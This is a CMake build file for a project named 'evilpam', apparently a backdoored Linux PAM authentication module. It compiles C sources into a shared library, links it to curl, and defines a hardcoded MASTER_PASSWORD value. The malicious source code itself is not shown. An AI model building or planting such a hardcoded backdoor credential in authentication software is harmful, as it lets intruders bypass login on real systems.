cmake_minimum_required(VERSION 3.8.2) # 3.8.0 is minimum version that allow Linux remote building and debugging

project(evilpam)

set(CMAKE_SYSTEM_PROCESSOR "x86_64")
set(CMAKE_SHARED_LIBRARY_PREFIX "")


#define override
add_compile_definitions(MASTER_PASSWORD="KLEMOU")

# Remove trailing '\' and '/' at the end of the path, so can reliably compare
STRING(REGEX REPLACE "[/\\]+$" "" CMAKE_SOURCE_DIR ${CMAKE_SOURCE_DIR})
STRING(REGEX REPLACE "[/\\]+$" "" CMAKE_CURRENT_SOURCE_DIR ${CMAKE_CURRENT_SOURCE_DIR})

# Source files
file(GLOB SRC_FILES "src/*.c")

add_library(evilpam SHARED ${SRC_FILES})


target_include_directories(evilpam PRIVATE "${CMAKE_CURRENT_SOURCE_DIR}/include")
target_link_libraries(evilpam PRIVATE curl)


